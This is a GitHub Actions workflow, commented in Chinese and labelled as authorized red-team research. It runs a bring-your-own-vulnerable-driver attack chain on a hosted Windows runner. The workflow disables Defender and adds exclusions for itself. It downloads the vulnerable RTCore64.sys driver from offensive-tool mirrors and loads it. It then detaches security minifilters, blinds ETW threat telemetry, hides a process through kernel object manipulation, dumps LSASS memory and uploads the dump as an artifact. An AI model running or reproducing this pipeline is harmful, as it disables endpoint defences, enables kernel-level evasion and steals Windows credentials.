name: Win BYOVD (hosted)

# kernelsdk BYOVD 验证 — 纯 GitHub-hosted runner(不依赖 self-hosted 17763)。
#
# 关键洞察(2026-07-06 确认):
#   1. hosted Windows runner 以管理员 + UAC 关闭运行(GitHub 官方文档)。
#   2. RTCore64.sys 是 MSI Afterburner 合法微软签名(CVE-2019-16098),
#      走正常签名验证路径 — 不需要 test-signing。
#   3. hosted runner 默认关 HVCI(Azure VM 性能优化),黑名单只在 HVCI 路径
#      强制执行 — HVCI 关 → RTCore64 可加载。
#
# 流程:
#   1. 探测 HVCI / 黑名单状态(Win32_DeviceGuard + 注册表)
#   2. HVCI 关 → 下载 RTCore64.sys(公开 PoC,运行时拉,不进 git)→ 构建
#      operator-kernel-cli → bootstrap BYOVD → 跑全 kernelsdk 路径
#      (pg-window / detach-minifilter / blind-etw / hide / dump-lsass)
#   3. HVCI 开 → 跳过,不挂 workflow(continue-on-error + 条件 step)
#
# 只覆盖 P0.a/b(纯算法,无需内核)+ P3.b(minidump CLI)+ ETW-TI/DKOM/LSASS
# (BYOVD IOCTL 路径)。P4/P5 在 windows-ci.yml 跑(纯用户态)。
#
# 授权红队安全研究。RTCore64.sys 在运行时从公开镜像下载,不进 git 历史,
# 不随 workflow artifact 上传(只在 runner 临时目录,job 结束即销毁)。

on:
  workflow_dispatch: {}
  push:
    branches: [main]
    paths:
      - '.github/workflows/windows-byovd-hosted.yml'
      - 'crates/operator-kernelsdk/**'
      - 'crates/operator-kernel-cli/**'
      - 'crates/offset-resolver/**'
      - 'crates/minidump-assembler/**'

concurrency:
  group: win-byovd-hosted
  cancel-in-progress: true

jobs:
  byovd:
    runs-on: windows-latest
    timeout-minutes: 25
    continue-on-error: true   # HVCI 开则跳过,不挂 workflow
    steps:
      - uses: actions/checkout@v4

      # ---- 0. 关键前置:探测 HVCI / 黑名单 / Defender 状态 ----
      - name: Probe HVCI + vulnerable driver blocklist + Defender status
        id: probe
        shell: powershell
        run: |
          Write-Host "=== OS build ==="
          $os = Get-CimInstance Win32_OperatingSystem
          Write-Host "OS: $($os.Caption) build $($os.BuildNumber)"

          Write-Host "=== Win32_DeviceGuard / VBS / HVCI 状态 ==="
          $dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction SilentlyContinue
          if ($dg) {
            $dg | Select-Object SecurityServicesConfigured, SecurityServicesRunning, VirtualizationBasedSecurityStatus, CodeIntegrityPolicyEnforcementStatus | Format-List
            $hvci_running = ($dg.SecurityServicesRunning -contains 2)
          } else {
            Write-Host "Win32_DeviceGuard 不可用(老 build 或无 VBS)— 视为 HVCI off"
            $hvci_running = $false
          }

          Write-Host "=== Vulnerable Driver Blocklist 注册表 ==="
          $bl = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config' -ErrorAction SilentlyContinue).VulnerableDriverBlocklistEnable
          Write-Host "VulnerableDriverBlocklistEnable = $bl (1=on, 0=off, 空=未设置)"

          Write-Host "=== Defender 状态 ==="
          $def = Get-MpComputerStatus -ErrorAction SilentlyContinue
          if ($def) {
            Write-Host "Defender AMRunningMode=$($def.AMRunningMode) RTP=$($def.RealTimeProtectionEnabled)"
          } else {
            Write-Host "Defender 未安装或不可用(hosted runner image 默认关)"
          }

          Write-Host "=== 管理员权限验证 ==="
          $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
          Write-Host "Running as Administrator: $isAdmin"

          Write-Host "=== 判定 ==="
          Write-Host "HVCI actively running: $hvci_running"
          if ($hvci_running) {
            Write-Host "::warning::HVCI is running — RTCore64.sys (在黑名单里) 加载会被挡。跳过 BYOVD job。"
            echo "skip=true" >> $env:GITHUB_OUTPUT
          } else {
            Write-Host "::notice::HVCI NOT running — RTCore64.sys 加载应该成功(合法签名 + 黑名单不强制)。"
            echo "skip=false" >> $env:GITHUB_OUTPUT
          }

      - name: Skip — HVCI blocks BYOVD
        if: steps.probe.outputs.skip == 'true'
        run: echo "Skipped BYOVD job (HVCI is on). kernelsdk 单测在 ci.yml 已覆盖(93/93 绿)。"

      # ---- 1. Defender 双保险(只在 HVCI 关时执行)----
      - name: Disable Defender + add exclusions
        if: steps.probe.outputs.skip == 'false'
        shell: powershell
        run: |
          Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
          Add-MpPreference -ExclusionPath "$env:GITHUB_WORKSPACE" -Force -ErrorAction SilentlyContinue
          Add-MpPreference -ExclusionProcess "nyx-kernel.exe","cargo.exe" -Force -ErrorAction SilentlyContinue
          $now = (Get-MpPreference -ErrorAction SilentlyContinue).DisableRealtimeMonitoring
          Write-Host "Defender realtime disabled (after step): $now"

      # ---- 2. 准备 RTCore64.sys(运行时下载,不进 git)----
      - name: Fetch RTCore64.sys (public PoC driver)
        if: steps.probe.outputs.skip == 'false'
        shell: pwsh
        run: |
          # RTCore64.sys = MSI Afterburner RTCORE64.SYS (CVE-2019-16098)。
          # 公开 PoC 驱动,从公开 BYOVD 集合下载。文件不进 git(在 target/,
          # 已 gitignore),不随 artifact 上传。
          $driverDir = New-Item -ItemType Directory -Force -Path "target\drivers"
          $driverPath = Join-Path $driverDir.FullName "RTCore64.sys"

          # 尝试多个公开镜像(任一可用即可)
          $mirrors = @(
            "https://github.com/BlackSnufkin/BYOVD/raw/main/DumpDrivers/RTCore64.sys",
            "https://github.com/zer0condition/BYOVD/raw/main/VulnerableDrivers/RTCore64.sys",
            "https://raw.githubusercontent.com/Al1ex/Red-Team-Infrastructure/master/BYOVD/RTCore64.sys"
          )
          $got = $false
          foreach ($url in $mirrors) {
            try {
              Write-Host "尝试下载: $url"
              Invoke-WebRequest -Uri $url -OutFile $driverPath -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
              $sz = (Get-Item $driverPath).Length
              if ($sz -gt 10000) {
                Write-Host "::notice::下载成功: $driverPath ($sz bytes)"
                $got = $true
                break
              }
            } catch {
              Write-Host "  失败: $($_.Exception.Message)"
            }
          }
          if (-not $got) {
            Write-Host "::error::所有镜像都失败 — 手动放 RTCore64.sys 到 target/drivers/ 后重试"
            exit 1
          }
          echo "DRIVER_PATH=$driverPath" >> $env:GITHUB_ENV

      # ---- 3. 构建 operator-kernel-cli(P0.a/b + 3.b + ETW-TI/DKOM/LSASS 路径)----
      - name: Install Rust + build operator-kernel-cli
        if: steps.probe.outputs.skip == 'false'
        uses: dtolnay/rust-toolchain@stable

      - name: Build nyx-kernel CLI
        if: steps.probe.outputs.skip == 'false'
        shell: cmd
        run: |
          REM cmd 避免 PS 5.1 NativeCommandError 吞 cargo stderr
          cargo build --release --manifest-path crates/operator-kernel-cli/Cargo.toml
          if not exist "crates\operator-kernel-cli\target\release\nyx-kernel.exe" (
            echo ::error::nyx-kernel.exe build failed & exit /b 1
          )
          echo BUILD_OK

      # ---- 4. BYOVD 真机回归(对应 M6 Task G-K + P0.a/b + P3.b)----
      - name: BYOVD bootstrap + kernelsdk 全路径
        if: steps.probe.outputs.skip == 'false'
        shell: cmd
        continue-on-error: true   # 个别 IOCTL 可能因 Defender 版本差异失败,不挂
        run: |
          REM ---- Task G: BYOVD 驱动加载 ----
          echo === Task G: BYOVD bootstrap ===
          crates\operator-kernel-cli\target\release\nyx-kernel.exe bootstrap --byovd "%DRIVER_PATH%" NyaRTCore
          echo BOOTSTRAP_EXIT=%ERRORLEVEL%
          if %ERRORLEVEL% NEQ 0 (
            echo ::warning::bootstrap 失败 — 可能 Defender 版本挡了 driver load
            exit /b 0
          )

          REM ---- P0.a: PatchGuard window ----
          echo === P0.a: PatchGuard window select ===
          REM pg-window 阻塞等 ENTER,这里只验证 select_pg_window 不崩;
          REM 用 echo 模拟 ENTER 让它立即 Drop 退出。
          echo. | crates\operator-kernel-cli\target\release\nyx-kernel.exe pg-window
          echo PG_WINDOW_EXIT=%ERRORLEVEL%

          REM ---- P0.b: MiniFilter detach(build 表自动 fallback,无需 --flt-rva)----
          echo === P0.b: MiniFilter detach ===
          crates\operator-kernel-cli\target\release\nyx-kernel.exe detach-minifilter
          echo MINIFILTER_EXIT=%ERRORLEVEL%

          REM ---- Task H: ETW-TI blind ----
          echo === Task H: ETW-TI blind ===
          crates\operator-kernel-cli\target\release\nyx-kernel.exe blind-etw
          echo BLIND_ETW_EXIT=%ERRORLEVEL%

          REM ---- Task I: DKOM hide(隐藏自己)----
          echo === Task I: DKOM process hide ===
          REM 用 explorer.exe 的 PID 做可见性测试(隐藏后立即 unhid 不影响系统)
          for /f "tokens=2" %%p in ('tasklist /fi "imagename eq explorer.exe" /nh') do (
            crates\operator-kernel-cli\target\release\nyx-kernel.exe hide %%p
            echo HIDE_EXIT=%ERRORLEVEL%
            goto hide_done
          )
          :hide_done

          REM ---- P3.b: LSASS dump(minidump 装配)----
          echo === P3.b: LSASS kernel read + minidump assemble ===
          for /f "tokens=2" %%p in ('tasklist /fi "imagename eq lsass.exe" /nh') do (
            crates\operator-kernel-cli\target\release\nyx-kernel.exe dump-lsass %%p
            echo DUMP_LSASS_EXIT=%ERRORLEVEL%
            goto dump_done
          )
          :dump_done

          REM ---- 验证 minidump 文件存在 ----
          echo === 验证 minidump 文件存在 ===
          dir lsass_*.dmp 2>nul || echo 无 dmp 文件(dump_lsass 可能未跑通)

      # ---- 5. minidump 文件格式验证(P3.a 产物)----
      - name: Verify minidump file format
        if: always() && steps.probe.outputs.skip == 'false'
        shell: pwsh
        continue-on-error: true
        run: |
          $dmp = Get-ChildItem -Path . -Filter "lsass_*.dmp" -ErrorAction SilentlyContinue | Select-Object -First 1
          if (-not $dmp) {
            Write-Host "::warning::无 lsass_*.dmp — dump-lsass 未产出(可能 IOCTL 路径失败)"
            return
          }
          Write-Host "minidump: $($dmp.Name) ($($dmp.Length) bytes)"
          # 验证 MDMP magic(4D 44 4D 50)
          $bytes = [IO.File]::ReadAllBytes($dmp.FullName)[0..3]
          $magic = [System.Text.Encoding]::ASCII.GetString($bytes)
          Write-Host "magic: $magic (期望 MDMP)"
          if ($magic -ne "MDMP") {
            Write-Host "::warning::magic 不是 MDMP — minidump 装配器或 dump_lsass 有问题"
          } else {
            Write-Host "::notice::minidump 格式正确(MDMP magic) — P3.a + P3.b 端到端通过"
          }

      # ---- 6. 上传诊断(不含 RTCore64.sys,避免 ToS)----
      - name: Upload BYOVD logs + minidump
        if: always() && steps.probe.outputs.skip == 'false'
        uses: actions/upload-artifact@v4
        with:
          name: byovd-hosted-${{ github.run_id }}
          path: |
            lsass_*.dmp
            offsets_*.toml
          if-no-files-found: ignore
          retention-days: 7
